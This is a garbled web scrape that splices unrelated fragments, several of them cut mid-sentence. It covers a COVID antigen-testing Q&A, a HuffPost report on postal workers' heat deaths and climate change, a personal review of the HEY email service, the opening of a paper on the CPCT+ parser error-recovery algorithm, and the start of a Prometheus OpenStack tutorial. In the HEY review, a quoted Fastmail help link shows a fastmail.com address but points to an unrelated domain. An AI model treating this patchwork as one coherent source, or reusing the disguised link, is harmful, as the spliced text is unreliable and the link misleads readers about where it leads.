<br> <strong>A:</strong> It’s possible that people might exhibit more risk after a false negative antigen test than after taking a PCR test and having to wait. However, this risk can be minimized by (a) educating people about sensitivity and (b) pairing the testing regime with other measures like masks and social distancing.</p>

<p><strong>Q:</strong> <em>Do antigen tests require those invasive pharyngeal swabs that go deep up your nose?</em>
<br> <strong>A:</strong> Not necessarily. While <a href="https://www.nytimes.com/2020/05/09/health/antigen-testing-fda-coronavirus.html">Quidel</a> and <a href="https://www.nytimes.com/reuters/2020/07/06/us/06reuters-health-coronavirus-becton-dickinson.html">Becton Dickinson</a> are producing pharyngeal swab antigen tests, another company called <a href="https://www.inquirer.com/news/spit-test-covid-coronavirus-orasure-fda-hiv--20200706.html">OraSure</a> is producing a saliva test. Will a saliva test be as accurate as a pharyngeal swab test? The evidence is mixed, with some studies suggesting it will be less accurate and others suggesting it will be more accurate (<a href="https://www.medrxiv.org/content/10.1101/2020.04.16.20067835v1">1</a>, <a href="https://www.medrxiv.org/content/10.1101/2020.05.26.20112565v1.full.pdf">2</a>, <a href="https://jcm.asm.org/content/jcm/55/1/226.full.pdf">3</a>).</p>

<p><strong>Q:</strong> <em>I heard that <a href="https://m.canadianinsider.com/sona-nanotech-announces-validation-results-for-its-covid-19-antigen-test">SONA</a> has an antigen test with 96% sensitivity. This sounds super promising!</em>
<br> <strong>A:</strong> This statistic is a bit misleading. The positive samples were generated in a laboratory. When antigen tests are done in real world clinical settings, the sensitivity is <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">lower</a>.</p>

<p><strong>Q:</strong> <em>Will we ever get a test that is both fast and sensitive?</em>
<br> <strong>A:</strong> The New York Times had a great <a href="https://www.nytimes.com/2020/07/06/health/fast-coronavirus-tests.html">article</a> last week on new types of point-of-care tests that are being developed, including <a href="https://www.medrxiv.org/content/10.1101/2020.06.13.20129841v1.full.pdf">HP-LAMP</a> and <a href="https://www.biorxiv.org/content/10.1101/2020.05.28.119131v1.full.pdf">SHINE</a>. These seem promising, although they are in an earlier stage of development than antigen tests, which already have several companies producing tests.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Illustration:&nbsp;Hokyoung Kim for HuffPost</em></p><p><span>When Peggy Frank returned to her mail route following three months of medical leave, Los Angeles was in the middle of a scorching <a href="https://www.huffpost.com/impact/topic/heat-wave" target="_blank" rel="noopener noreferrer">heat wave</a>.</span><span><br></span></p><p><span>The 63-year-old letter carrier had slipped on a patch of wet leaves and broken her ankle in March, and she spent the spring at home in a walking boot. Although the injury still bothered her, Frank had been cleared to go back to work. She was just two years away from retirement when she climbed back into her <a href="https://www.huffpost.com/topic/united-states-postal-service" target="_blank" rel="noopener noreferrer">U.S. Postal Service</a> truck on July 6, 2018.</span><span><br></span></p>        <!-- entry_paragraph_1_ad -->
    
<p><span>The temperature had topped out in the high 80s in the first days of the month, but then it shot up dramatically after the July 4 holiday, putting Southern California under an extreme heat advisory. On July 5, the highs surpassed 100 degrees.</span><span><br></span></p><p><span>Frank’s sister, Lynn Calkins, had warned her to be safe as she prepared for her first day back. “I said, ‘You’re not used to it. Just be careful,’” Calkins recalled.&nbsp;</span><span><br></span></p><p><span>The two shared a townhouse in the North Hills neighborhood, and Calkins always made sure the ice trays were filled the evening before a hot day so Frank could load up her water jug before heading out at 7:30 a.m.</span></p><p><span>Getting an early start on her Woodland Hills route only helped so much ― it was <a href="https://www.cbsnews.com/news/southern-california-heat-wave-breaks-records-in-los-angeles-today-2018-07-06/" target="_blank" rel="noopener noreferrer">closing in on 100 degrees</a> in downtown Los Angeles by late morning. By the afternoon, the weather stations in nearby Burbank and Van Nuys, in Los Angeles’ San Fernando Valley, hit 114 and 117, respectively ― the hottest temperatures <a href="https://www.washingtonpost.com/news/capital-weather-gang/wp/2018/07/06/monster-heat-dome-threatens-all-time-high-temperature-records-in-southern-california-friday/" target="_blank" rel="noopener noreferrer">ever recorded</a> there.</span></p></div><figure>
        </figure><div><p><span>Frank would have found no respite in her mail truck. Most of the Postal Service fleet is roughly three decades old and not equipped with air conditioning. The only relief is a pair of open windows and a small fan attached to the dashboard.&nbsp;</span></p><p><span>Frank struggled to keep pace. About 2 p.m., she called her supervisor to say she was falling behind and might not finish on time ― standard practice for a letter carrier who’s lagging, since managers want to avoid running into overtime.</span></p><p><span>The post office dispatched another employee to meet Frank on her route and give her a hand.</span></p><p><span>When her colleague reached her, Frank was unconscious in the driver’s seat. Paramedics recorded her death at 3:35 p.m.</span></p><h3>‘Neither Snow Nor Rain Nor Heat’</h3><p><span>Working for the Postal Service can be a </span><a href="https://theoutline.com/post/1836/the-us-postal-service-is-an-extremely-dangerous-place-to-work?zd=2&amp;zi=pdxz3eli" target="_blank" rel="noopener noreferrer"><span>surprisingly dangerous job</span></a><span>. While back sprains and dog bites are common for letter carriers, some of the greatest hazards are encapsulated in the agency’s </span><a href="https://about.usps.com/who-we-are/postal-history/mission-motto.pdf" target="_blank" rel="noopener noreferrer"><span>unofficial motto</span></a><span>: </span><em><span>Neither snow nor rain nor heat nor gloom of night stays these couriers from the swift completion of their appointed rounds.</span></em></p><p><span>An analysis of records shows the <a href="https://www.huffpost.com/topic/occupational-safety-and-health-administration" target="_blank" rel="noopener noreferrer">Occupational Safety and Health Administration</a> issued more than $1.3 million in initial fines against the Postal Service for heat hazards in eight years ― a large sum by OSHA standards. In many cases, the Postal Service managed to negotiate those fines down to a few thousand dollars each, or even to nothing at all, by agreeing to address the hazards.</span></p><p><span>But the continued accumulation of big-ticket citations for repeat violations shows the Postal Service hasn’t fixed its problem. OSHA files share common themes: carriers toiling inside hot vehicles, feeling pressured to complete their routes on time, and returning to work in dangerously hot weather without being </span><a href="https://www.cdc.gov/niosh/topics/heatstress/acclima.html" target="_blank" rel="noopener noreferrer"><span>acclimatized</span></a><span>. They also show postal officials pointing to the agency’s troubled finances in pleas to reduce fines while working to limit the legal scope of agreements to protect employees.</span></p><p><span>After Missouri letter carrier John Watzlawick died of hyperthermia in 2012, OSHA cited the Postal Service for willfully violating safety law and issued a fine of $70,000. The Postal Service agreed to implement new safeguards in 2014 to settle the case, but Watzlawick’s widow, Kay, has watched with dismay as the citations have continued.</span></p><p><span>“I want something done,” she told HuffPost.</span></p><p><span>An analysis by the Center for Public Integrity last year found that the Postal Service had </span><a href="https://publicintegrity.org/inequality-poverty-opportunity/workers-rights/worker-health-and-safety/extreme-heat-post-worker-health/" target="_blank" rel="noopener noreferrer"><span>exposed about 900 workers</span></a><span> to heat hazards since 2012, leading to muscle cramps, vomiting and loss of consciousness. Close to 100 workers had been hospitalized for heat-related illnesses since 2015, the site reported. Because the hospitalizations are self-reported by employers, the full tally over that span is likely higher and wouldn’t reflect the times when workers got sick but didn’t end up in the hospital.</span></p><p><span>Of at least four carriers whose deaths since 2012 involved heat, three had recently returned to work from a long absence. Occupational health experts say it’s critical that workers who have been off the job are eased back into their roles over the course of several days so that their bodies have time to readjust to high temperatures.</span></p></div><figure>
        </figure><div><p><span>Debbie Berkowitz, who worked as a chief of staff and senior adviser at OSHA and is now a safety expert at the </span><a href="https://www.nelp.org/" target="_blank" rel="noopener noreferrer"><span>National Employment Law Project</span></a><span>, said these large penalties are rare. “These are fines given to companies where OSHA has really solid evidence that they knew about the hazard and they still haven’t abated the conditions,” said Berkowitz. “I think getting the mail to customers is such a big priority that they have overlooked protecting their workers ― and overlooked it repeatedly.”</span></p><p><span>The Postal Service’s sprawling workforce includes about&nbsp;</span><a href="https://www.bls.gov/oes/2018/may/oes435052.htm" target="_blank" rel="noopener noreferrer"><span>340,000 letter carriers</span></a><span>, and whatever the weather may bring, Americans expect their mail six days a week. Though the agency declined&nbsp;</span><span>to make an official available for an interview on the subject, a spokesperson said the USPS formalized a heat illness prevention program in 2018, drawing on protocols that were already in place, and that employee safety is a “top priority.”&nbsp;</span><span>In regular meetings, workers are reminded to stay hydrated, wear cool clothing, find shade if necessary and call 911 if they start to experience heat exhaustion or heat stroke.</span></p><p><span>The spokesperson said supervisors provide mandatory training on the signs of heat illness and make sure </span><span>workers “have the resources needed to do their jobs safely.” </span></p><p><span>But the challenges will only become greater as heat records continue to be broken due to global warming.&nbsp;</span>The Los Angeles Daily News, which covered Frank’s death closely, reported that <a href="https://www.dailynews.com/2019/08/19/heres-what-woodland-hills-mail-carriers-say-is-different-at-the-post-office-after-peggy-franks-death-a-year-ago-in-extreme-heat/" target="_blank" rel="noopener noreferrer">another carrier</a> from the same post office was hospitalized for heat illness a year ago, on a day when the temperature hit 100.</p><h3>Climate Change Is Making Hot Days Hotter</h3><p><span>Postal workers make for a disturbing case study in the evolving dangers of outdoor work. Anyone who does a physical job exposed to the elements will face greater hazards <a href="https://www.huffpost.com/impact/topic/climate-change" target="_blank" rel="noopener noreferrer">as the climate changes</a>. And many workers, such as roofers, farmworkers and landscapers, are doing strenuous jobs without the union protections that postal employees have, making them more reluctant to speak up.</span></p><p><span>“As a rule of thumb, if we fail to act to reduce carbon emissions, then by midcentury a typical summer day will be as hot as the hottest single day of summer is today,” said Michael Mann, a climatologist who directs the </span><a href="http://www.essc.psu.edu/" target="_blank" rel="noopener noreferrer"><span>Earth System Science Center</span></a><span> at Pennsylvania State University.</span></p><p><span>“And the hottest day of summer? There is simply no analog in the past for what that will look like.”</span></p><p><em>BELOW: The number of extremely hot days each summer will increase significantly due to global warming.</em></p></div><figure>
        </figure><div><p><span>In some respects, that disturbing future has already arrived. The year 2019 was the </span><a href="https://www.noaa.gov/news/2019-was-2nd-hottest-year-on-record-for-earth-say-noaa-nasa" target="_blank"><span>second-hottest</span></a><span> in 140 years of National Oceanic and Atmospheric Administration records, falling behind only 2016. So far, 2020 is shaping up to be </span><a href="https://www.ncdc.noaa.gov/sotc/briefings/20200618.pdf" target="_blank" rel="noopener noreferrer"><span>even more sweltering</span></a><span> than last year. Based on temperature data through May, the NOAA says this year is “virtually certain” to crack the top five and stands a nearly 50% chance of being the hottest ever.</span></p><p><span>At HuffPost’s request, Michelle Tigchelaar, a climate scientist at Stanford University, analyzed how much more vulnerable letter carriers will be to extreme heat as global warming worsens. Factoring in clothing, work pace and access to shade, Tigchelaar’s data assumes a day in which the heat index hits 94.5 degrees Fahrenheit constitutes a danger to carriers. Her findings show that workers would face far more unsafe working days under an increase of 2 degrees Celsius (3.6 degrees Fahrenheit), let alone 4 degrees (7.2 F).</span></p><p><span>The new working environment will be much worse in the South and Midwest. For instance, a letter carrier in Detroit now faces about 10 days a year in which the heat index hits 94.5. But under a 3.6-degree F increase, that jumps to 43 days a year. Under a 7.2-degree increase, it shoots up to 79 days a year. In places like Miami, Phoenix and Houston, more than one out of every three days each year would pose a heat hazard.</span></p><p><span>There are several ways outdoor workers can mitigate heat ― working at a slower pace, taking frequent breaks, having access to air conditioning. Most of them come with a loss of productivity or some other expense. Employers will have to shift schedules around, keeping workers indoors during the hottest hours. For postal employees, that could mean delivering parcels after dark, raising other safety concerns.</span></p><p><span>And unlike, say, agricultural work, which will shift geographically as the climate changes, parcels will still need to be delivered in the most oppressively hot regions. Even though there will be fewer heat waves in mild climates like Seattle, the workers in those areas will be less physiologically prepared when the temperature does soar.</span></p><p><span>Keeping all workers safe in heat can be tricky because everybody’s resilience is different. Some workers can tolerate much more than others. For someone like Peggy Frank, there was no knowing where her limit was until she passed it.</span></p><p><em>BELOW: Letter carriers will face far more unsafe working days due to extreme heat as global warming worsens.

</figure></action-text-attachment><p>I've been a fanboy of DHH and Jason of <a href="https://basecamp.com/">Basecamp</a> since around 2006 when I first read <a href="https://basecamp.com/gettingreal">Getting Real</a> and started writing code in <a href="https://rubyonrails.org/">Rails</a>. We used Basecamp (and for a brief time, Highrise) as our primary communication tool for the first few years of <a href="https://freeagent.com/">FreeAgent</a> and it was a big influence from a product point of view. For the past 8 years though, I've not really used Basecamp products but I have remained a follower of the company and founders, reading their books and enjoying their Twitter rants. I'm still an ardent Rails fan as well – I rarely code at work these days so I built an app for this blog during lockdown to scratch that particular itch 👨‍💻&nbsp;</p><p>When I heard about HEY, I was immediately interested. Not because I've lost control of my inbox (I'm an order-freak and avid filterer so my inbox is generally a tranquil place), but because the HEY statement about why "Email’s a treasure" rang so true to me and because a brand-new, Rails-based, Basecamp product is always going to be pretty exciting to try.</p><p>I got my invite early and I've been kicking the tyres for a while, so I've written up a few thoughts to get them out there and to hear about what other people think.&nbsp;</p></div><div>
<p>I've been using email for 28 years. I got my first email account back in 1992 when I started university and I rarely received any email from what I can remember. I probably got the odd message from tutors, but during uni my online communication was largely centred on <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a>. Remember that?</p><p>On leaving university I didn't use email for a while. I got my first job via a <a href="https://en.wikipedia.org/wiki/Usenet">Usenet</a> forum so I must have used email for that, but it wasn't until the arrival of Hotmail a year or two later that I had my first 'permanent' email address and could access it anywhere (still a limited choice in 1996!). I got my first work email with my second job and then I moved on from Hotmail to Yahoo and stuck that out until 2003 when Gmail launched (and after Yahoo inexplicably deleted all my email by accident).&nbsp;</p><p>I stayed happily with Google until 2015 when I moved over to Fastmail so I could use my own domain and pay for a proper email product and not be the product myself. I still use Gmail (via G Suite) for work though.</p></div><div><p>With the arrival of HEY, I loved the privacy-first focus (no more 'spy trackers') and the new workflows (Set Aside, Focus and Reply etc) sounded great. <a href="https://www.youtube.com/watch?v=UCeYTysLyGI">Jason's demo</a> was compelling. I'm fascinated by what they've achieved with modern Rails and Javascript, the simplicity of the front-end code and speed of it all really is a triumph.&nbsp;</p><p>However once I got invited, the reality of using it has been something of a mixed bag of utter delight with some frustrations. Let's dig into it.</p></div><div>
<p><strong>Focus and Reply<br></strong>This is a headline feature and it's really very good. Flag your emails 'Reply Later' as you're reading your new mails and stack them up for dealing with later. When you're ready, Focus and Reply lets you hammer through them all at once from a single screen. It's a brilliant workflow.</p><action-text-attachment content-type="image" url="https://hey.com/assets/how-it-works/reply-mode-60e4b5c00da627a4738e055d295e13d848d4ecdd806aad1e7bbec4a8ac0d8c32.png" width="1800" height="1871"><figure>

</figure></action-text-attachment></div><p><strong>Spy Tracking</strong></p><div><p>I think the Spy Tracker support is brilliant and should become the standard in all email apps. Perhaps it will. I actually emailed Fastmail about this and their reply was pretty interesting:</p></div><blockquote>
<em>We've blocked remote images from loading by default for years: </em><a href="https://codepatterns.org/help/receive/remotecontent.html?u=90cc41d3"><em>https://www.fastmail.com/help/receive/remotecontent.html</em></a><em>.&nbsp;<p>And if you do enable remote loading of images for your known contacts, or you just enable it for a single message, then our servers proxy the images, so all the sender can know is details about our hosts and nothing about you.&nbsp;</p></em>
</blockquote><div><p>So, actually, Fastmail are pretty much doing the same thing other than alerting you to the fact that emails are using SendGrid or whatever?</p></div><p><strong>Clips</strong></p><div>

</figure></action-text-attachment><p>Clips is a brilliant feature that I never knew I needed. Highlight some text and save it in your list of clips. I can see this feature being expanded in the future, such as filtering and being able to set expiry dates.</p></div><p><strong>Custom Domains</strong></p><div><p>Perhaps the most common complaint I've seen on Twitter is the lack of custom domain support. I run email off my own domain so this is of course something of a blocker to my own full-time adoption. I did try forwarding my email into HEY for a while so I could use the app in anger, but I'm not yet ready to make my @hey.com address my default so I've paused this for now. <a href="https://hey.com/custom-domains/">Custom domains are coming</a> in 2020 and I'm excited to see what they offer from day one. I hope they nail it.</p></div><p><strong>🔕 Notifications&nbsp;</strong></p><div><p>Despite being something of an <a href="https://www.youtube.com/watch?v=z9UjeTMb3Yk">inbox zero</a> fiend, I have no problem with the <strong>Previously Seen</strong> list in my Imbox. I really like the idea of <strong>Paper Trail</strong> and <strong>The Feed</strong>, and autofiling email in there is great but I have a real gripe with notifications. I definitely <em>don't</em> want to be notified via push on my phone when a new item hits either of these areas, but when I log into HEY I definitely <em>do</em> want to be notified, visually, that there's something new to view in these areas. As it stands, I have to compulsively check each one irrespective of whether there's something new. HEY's philosophy is that I should ignore them entirely until I feel like reading my Feed, but in reality this is never going to work for me. I'd like to have HEY alert me to the fact that there's something there, and if I feel like reading the feed at that time I will, otherwise I'll come back later. If I don't know, I feel compelled to check which is just a waste of time.</p><p>Now forgive me for my sins, but I actually want to receive notifications for emails that hit my Imbox by default, not the other way round. With HEY there is no way to do this – no notifications at all. You have to manually edit each contact and enable notifications for them specifically. I'd much rather HEY let me choose which is <em>my</em> preferred default, irrespective of the philosophy. Let me default to on.</p><p><strong>Imbox</strong></p></div><p>Please just call it Inbox! I can never unsee a typo here, I'm sorry. I understand but it just doesn't work for me.</p><div>
<p><strong>Quoted text rendering</strong><br>This is a total design challenge and HEY is no worse than Gmail in this regard, but I have to say Fastmail do a far better job of it. HEY rendering feels like a backwards step after using Fastmail and its multi-coloured threading. Hopefully it will improve over time.</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82Nz9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--91de462762132f39e441634c12f167e819f1c6ca" content-type="image/jpeg" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f569091fa601e5688d3533388044e529e598f984/IMG_0171.JPG" filename="IMG_0171.JPG" filesize="38317" width="780" height="520" previewable="true" presentation="gallery" caption="Fastmail's tasty quote rendering"><figure>

</figure></action-text-attachment><p><strong>Exporting</strong><br>The export to MBOX feature is great – it's my data and it means I'm not locked in. I know that if I decide to leave HEY, I can easily export all my mail and push it back into Fastmail. However, I like to label a bunch of my emails and currently this metadata will be lost when exporting from HEY. I suggested to DHH that they use IMAP folders in the export to maintain label information and <a href="https://twitter.com/lylo/status/1275426572053471233?s=20">he said it was a good idea</a>, so perhaps it will see the light of day soon 🤞</p></div><p><strong>😴 Snooze</strong></p><p>Set Aside is great, I like it a lot. But sometimes there are emails that I want to set aside for a longer period and the Snooze feature in Gmail and Fastmail is super-handy for this. When you set something aside in HEY, the email is there in the stack, staring at you in the face every time you visit. This isn't desirable for 'set aside for ages' emails, so a Snooze function (either as part of Set Aside, or just in general) would be great.&nbsp;</p><div><p>Undoubtedly the killer feature of HEY is the built-in workflow. Some people have suggested that this is a feature that could be replicated in standard email, so I had a crack at this with my Fastmail account. While not being a match for HEY, it actually worked surprisingly well!</p><p>I first created labels for <strong>Reply Later</strong>, <strong>Set Aside</strong>, <strong>The Feed</strong> and <strong>Paper Trail:</strong></p></div><div>

</figure></action-text-attachment><p>Moving mail into Reply Later or Set Aside is really easy in Fastmail because of their keyboard shortcuts: view the mail, click 'm' to bring up the 'Move' menu and then start typing 'Repl..' to label it as Reply Later. Admittedly not as slick as HEY but it's blazingly fast (as are most things in Fastmail) when you're used to it. </p><p>I then set up rules to move things into The Feed and Paper Trail. Again, not as simple as with HEY but the rules in Fastmail are very powerful so you do have a bit more flexibility here:</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82ND9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--0497b10d4c7160b0d8f48c584f1fa4aace19103f" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5a85ebb4b8d252c1a8cd1e5242edeed0eb627d8c/image.png" filename="image.png" filesize="18662" width="465" height="117" previewable="true" presentation="gallery" caption="Using Fastmail's powerful rules to replicate The Feed"><figure>

It turns out it's extremely rare that I receive an email from someone that I want to screen out. I can do this in Fastmail using blocking, but my blocklist is virtually empty. </p><p>If I was using HEY for my work email, however, it would be a <strong>completely different story </strong>which does make me wonder whether HEY's future success really lies in the business market.</p></div><div><p>Using HEY is a really nice and unique email experience, but it's early days and 'power users' like me will likely find it lacking in some areas. </p><p>I've already paid for my first year because I love the @hey.com email address, I really want to try HEY with custom domains when they launch, and I also want to see how it develops in the coming year. I'm also happy to pay Basecamp to keep developing this product as it feels important right now. <strong>The world needs more players in the email provider space, especially high-quality, privacy-focused products</strong>. Until HEY arrived, Fastmail was the only <em>major</em> player other than the obvious 'free' options of Gmail, Microsoft and Yahoo.</p><p>Can HEY fully replace Fastmail for me though? Will I be renewing in 12 month's time?</p><p>Once custom domains land, I think it <em>could</em> replace Fastmail for me. That said, I'll likely still end up paying for Fastmail irrespective of how HEY develops simply because of their excellent multi-domain support. So I'll probably end up paying for both! 😅</p><p>With Fastmail I can create forwarders on my family domain for the kids (I really hope HEY's custom domain feature will support this, but I'm not confident they will). I can also support fully-featured email on all the domains I own (such as the one for this blog!) without incurring any additional cost or hassle dealing with other email providers.

<p><strong>Abstract</strong>  
<span>Syntax errors are generally easy to fix for humans, but not for parsers in general nor LR parsers in</span>
<span>particular. Traditional ‘panic mode’ error recovery, though easy to implement and applicable to</span>
<span>any grammar, often leads to a cascading chain of errors that drown out the original. More</span>
<span>advanced error recovery techniques suffer less from this problem but have seen little practical use</span>
<span>because their typical performance was seen as poor, their worst case unbounded, and the</span>
<span>repairs they reported arbitrary. In this paper we introduce the </span><span>CPCT</span><span>+</span>  <span>algorithm, and an</span>
<span>implementation of that algorithm, that address these issues. First, </span><span>CPCT</span><span>+</span> <span>reports the complete set of</span>
<span>minimum cost repair sequences for a given location, allowing programmers to select the one that</span>
<span>best fits their intention. Second, on a corpus of 200,000 real-world syntactically invalid Java</span>
<span>programs, </span><span>CPCT</span><span>+</span>  <span>is able to repair 98.37%</span><span>±</span><span>0.017% </span><span>of files within a timeout of 0.5s. Finally,</span>
<span>CPCT</span><span>+</span> <span>uses the complete set of minimum cost repair sequences to reduce the cascading error</span>
<span>problem, where incorrect error recovery causes further spurious syntax errors to be identified.</span>
<span>Across the test corpus, </span><span>CPCT</span><span>+</span> <span>reports 435,812</span><span>±</span><span>473 </span><span>error locations to the user, reducing the</span>
<span>cascading error problem substantially relative to the 981,628</span><span>±</span><span>0 </span><span>error locations reported by panic</span>
<span>mode.</span>

<h3><span>1</span> <a id="x1-10001"></a>Introduction</h3>
<!--l. 131--><p>Programming is a humbling job which requires acknowledging that we will make untold errors in
our quest to perfect a program. Most troubling are semantic errors, where we intended the
program to do one thing, but it does another. Less troubling, but often no less irritating, are
syntax errors, which are generally minor deviances from the exacting syntax required by a
compiler. So common are syntax errors that parsers in modern compilers are designed to cope
with us making several: rather than stop on the first syntax error, they attempt to
<span>recover </span>from it. This allows them to report, and us to fix, all our syntax errors in one
go.
</p><!--l. 141--><p>When error recovery works well, it is a useful productivity gain. Unfortunately, most current
error recovery approaches are simplistic. The most common grammar-neutral approach to error
recovery are those algorithms described as ‘panic mode’ (e.g.&nbsp;[<a href="#Xholub90compilerdesign">13</a>, p.&nbsp;348]) which skip input until
the parser finds something it is able to parse. A more grammar-specific variation of this
idea is to skip input until a pre-determined synchronisation token (e.g. ‘;’ in Java) is
reached&nbsp;[<a href="#Xdegano95comparison">8</a> , p.&nbsp;3], or to try inserting a single synchronisation token. Such strategies are
often unsuccessful, leading to a cascade of spurious syntax errors (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an
example). Programmers quickly learn that only the location of the first error in a file – not
the reported repair, nor the location of subsequent errors – can be relied upon to be
accurate.

<!--l. 233--><p>It is possible to hand-craft error recovery algorithms for a specific language. These
generally allow better recovery from errors, but are challenging to create. For example,
the Java error recovery approach in the Eclipse IDE is 5KLoC long, making it only
slightly smaller than a modern version of Berkeley Yacc — a complete parsing system!
Unsurprisingly, few real-world parsers contain effective hand-written error recovery
algorithms.
</p><!--l. 240--><p>Most of us are so used to these trade-offs (cheap generic algorithms and poor recovery
vs.&nbsp;expensive hand-written algorithms and reasonable recovery) that we assume them to be
inevitable. However, there is a long line of work on more advanced generic error recovery
algorithms. Probably the earliest such algorithm is Aho and Peterson&nbsp;[<a href="#Xaho72minimum">1</a>], which, upon
encountering an error, creates on-the-fly an alternative (possibly ambiguous) grammar which
allows the parser to recover. This algorithm has fallen out of favour in programming
language circles, probably because of its implementation complexity and the difficulty of
explaining to users what recovery has been used. A simpler family of algorithms, which
trace their roots to Fischer <span>et al.</span>&nbsp;[<a href="#Xfischer79locally">11</a>], instead try to find a single minimum cost <span>repair</span>
<span>sequence </span>of token insertions and deletions which allow the parser to recover. Algorithms in
this family are much better at recovering from errors than naive approaches and can
communicate the repairs they find in a way that humans can easily replicate. However, such
algorithms have seen little practical use because their typical performance is seen as
poor and their worst case unbounded [<a href="#Xmckenzie95error">17</a>, p.&nbsp;14]. We add a further complaint: such
approaches only report a single repair sequence to users. In general – and especially in
syntactically rich languages – there are multiple reasonable repair sequences for a given
error location, and the algorithm has no way of knowing which best matches the user’s
intentions.
</p><!--l. 261--><p>In this paper we introduce a new error recovery algorithm in the Fischer <span>et al. </span>family, <span>CPCT</span><span>+</span>.
This takes the approach of Corchuelo <span>et al.</span>&nbsp;[<a href="#Xcorchuelo02repairing">5</a>] as a base, corrects it, expands it, and
optimises its implementation. <span>CPCT</span><span>+</span> is simple to implement (under 500 lines of Rust
code), is able to repair nearly all errors in reasonable time, reports the complete set of
minimum cost repair sequences to users, and does so in less time than Corchuelo <span>et</span>
<span>al.</span>.
</p><!--l. 269--><p>We validate <span>CPCT</span><span>+</span> on a corpus of 200,000 real, syntactically incorrect, Java programs
(Section&nbsp;<a href="#x1-140006">6<!--tex4ht:ref: experiment --></a>). <span>CPCT</span><span>+</span> is able to recover 98.37%<span>±</span><span>0.017% </span>of files within a 0.5s timeout and does so
while reporting fewer than half the error locations as a traditional panic mode algorithm: in other
words, <span>CPCT</span><span>+</span> substantially reduces the cascading error problem. We also show – for, as far as we
know, the first time – that advanced error recovery can be naturally added to a Yacc-esque
system, allowing users to make fine-grained decisions about what to do when error recovery has
been applied to an input (Section&nbsp;<a href="#x1-180007">7<!--tex4ht:ref: sec:api --></a>). We believe that this shows that algorithms such as <span>CPCT</span><span>+</span>
are ready for wider usage, either on their own, or as part of a multi-phase recovery
system.
</p>
<h4><span>1.1</span> <a id="x1-20001.1"></a>Defining the problem</h4>
<!--l. 285--><p>Formally speaking, we first test the following hypothesis:
</p><!--l. 287--><dl><dt>
<span>H1</span></dt><dd>The complete set of minimum cost repair sequences can be found in acceptable time.</dd></dl>
                                                                            
                                                                            
<!--l. 292--><p>The only work we are aware of with a similar concept of ‘acceptable time’ is&nbsp;[<a href="#XdeJonge12natural">6</a>], who define it
as the total time spent in error recovery per file, with a threshold of 1s. We use that
definition with one change: Since many compilers are able to fully execute in less than 1s,
we felt that a tighter threshold is more appropriate: we use 0.5s since we think that
even the most demanding users will tolerate such a delay. We strongly validate this
hypothesis.
</p><!--l. 300--><p>The complete set of minimum cost repair sequences makes it more likely that the programmer
will see a repair sequence that matches their original intention (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an example;
Appendix&nbsp;<a href="#x1-28000A">A<!--tex4ht:ref: app:examples --></a> contains further examples in Java, Lua, and PHP). It also opens up a new
opportunity. Previous error recovery algorithms find a single repair sequence, apply that to the
input, and then continue parsing. While that repair sequence may have been a reasonable local
choice, it may cause cascading errors later. Since we have the complete set of minimum
cost repair sequences available, we can select from that set a repair sequence which
causes fewer cascading errors. We thus rank repair sequences by how far they allow
parsing to continue successfully (up to a threshold — parsing the whole file would, in
general, be too costly), and choose from the subset that gets furthest (note that the
time required to do this is included in the 0.5s timeout). We thus also test a second
hypothesis:
</p><!--l. 315--><dl><dt>
<span>H2</span></dt><dd>Ranking the complete set of minimum cost repair sequences by how far they allow
parsing to continue locally reduces the global cascading error problem.</dd></dl>
<!--l. 321--><p>We also strongly validate this hypothesis. We do this by comparing ‘normal’ <span>CPCT</span><span>+</span> with a
simple variant <span>CPCT</span><span>+</span><span>rev</span> which reverses the ranking process, always selecting from amongst the
worst …</p></div></div>

July 15, 2020 | https://yetiops.net/posts/prometheus-service-discovery-openstack/ | <a href="https://web.archive.org/web/*/https://yetiops.net/posts/prometheus-service-discovery-openstack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In a previous <a href="https://yetiops.net/posts/prometheus-service-discovery-aws-gcp-azure/">post</a> I mentioned that Prometheus has a number of ways to discover services. This ranges from statically defined configuration to consuming APIs from different cloud providers. So far, we have covered: -</p>
<ul>
<li><a href="https://yetiops.net/posts/prometheus-service-discovery-aws-gcp-azure/">AWS, Azure and Google Cloud Platform</a></li>
<li><a href="https://yetiops.net/posts/prometheus-service-discovery-digitalocean/">Digital Ocean</a></li>
</ul>
<p>In this post we will cover discovering services running on OpenStack.</p>
<h2 id="what-is-openstack">What is OpenStack?</h2>
<p>OpenStack is a way of running your own Infrastructure-as-a-service platform. It enables you to deploy compute, storage, networking and other resources similar to the major cloud providers. It began as a joint venture between <a href="https://www.rackspace.com/">Rackspace</a> and <a href="https://www.nasa.gov/">NASA</a> to provide an Open Source cloud solution.</p>
<p>Initially, OpenStack was embraced by a number of different sectors of the IT industry. Some companies saw it as a way to become an alternative to the likes of AWS or Azure (eg <a href="https://en.wikipedia.org/wiki/HPE_Helion">HPE Helion</a>, <a href="https://www.ovh.co.uk/">OVH</a>, <a href="https://carrier.huawei.com/en/products/IT/cloud-computing">Huawei</a>). For others, it enabled them to use their existing hardware while being able to spin up resources in a cloud-like way.</p>
